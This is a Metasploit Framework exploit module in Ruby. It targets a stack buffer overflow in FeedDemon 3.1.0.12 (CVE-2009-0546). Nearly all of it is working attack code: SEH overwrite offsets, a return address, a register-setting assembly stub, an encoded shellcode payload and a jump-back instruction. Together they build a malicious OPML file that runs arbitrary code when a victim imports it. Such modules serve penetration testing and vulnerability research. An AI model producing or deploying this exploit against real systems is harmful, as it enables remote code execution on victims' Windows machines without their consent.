##
# $Id: feeddemon_opml.rb 9405 2010-06-03 05:10:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FeedDemon <= 3.1.0.12 Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in FeedDemon v3.1.0.12. When the application
				is used to import a specially crafted opml file, a buffer overflow occurs allowing
				arbitrary code execution.

				All versions are suspected to be vulnerable. This vulnerability was originally reported
				against version 2.7 in February of 2009.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'fl0 fl0w',  # Original Exploit
					'dookie',    # MSF Module
					'jduck'      # SEH + AlphanumMixed fixes
				],
			'Version'        => '$Revision: 9405 $',
			'References'     =>
				[
					[ 'CVE', '2009-0546' ],
					[ 'OSVDB', '51753' ],
					[ 'BID', '33630' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/7995' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/8010' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/11379' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x0a\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xff",
					'DisableNops' => true,
					# We are not strictly limited to alphanumeric. However, currently
					# no encoder can handle our bad character set.
					'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
						},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested OK on XPSP3 - jduck
					[ 'Windows Universal',
						{
							'Ret' => 0x00501655   # p/p/r in FeedDemon.exe v3.1.0.12
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Feb 09 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'msf.opml']),
			], self.class)

	end

	def exploit

		head_opml = '<opml version="1.1">'
		head_opml << '<body>'
		head_opml << '<outline text="'

		header = "\xff\xfe" # Unicode BOM
		header << Rex::Text.to_unicode(head_opml)

		foot_opml = '">'
		foot_opml << '<outline text="BKIS" title="SVRT" type="rss" xmlUrl="http://milw0rm.com/rss.php"/>'
		foot_opml << '</outline>'
		foot_opml << '</body>'
		foot_opml << '</opml>'
		footer = Rex::Text.to_unicode(foot_opml)

		# Set ECX to point to the alphamixed encoded buffer (IIIII...)
		# We use an offset from esp, while avoiding bad chars
		off = 0x410
		set_ecx_asm = %Q|
			push esp
			pop ecx
			add ecx, #{0x01010101 + off}
			sub ecx, 0x01010101
		|
		set_ecx = Metasm::Shellcode.assemble(Metasm::Ia32.new, set_ecx_asm).encode_string

		# Jump back to the payload, after p/p/r jumps to us.
		# NOTE: Putting the jmp_back after the SEH handler seems to avoid problems with badchars..
		# 8 for SEH.Next+SEH.Func, 5 for the jmp_back itself
		distance = 0x1ffd + 8 + 5
		jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string

		# SEH
		seh_frame = generate_seh_record(target.ret)

		# Assemble everything together
		sploit = ''
		sploit << set_ecx
		sploit << payload.encoded
		sploit << rand_text_alphanumeric(8194 - sploit.length)
		sploit << seh_frame
		sploit << jmp_back
		sploit << rand_text_alphanumeric(8318 - sploit.length)
		# Ensure access violation reading from smashed pointer
		num = rand_text(4).unpack('V')[0]
		sploit << [num | 0x80000000].pack('V')

		evil = header + sploit + footer

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(evil)

	end

end
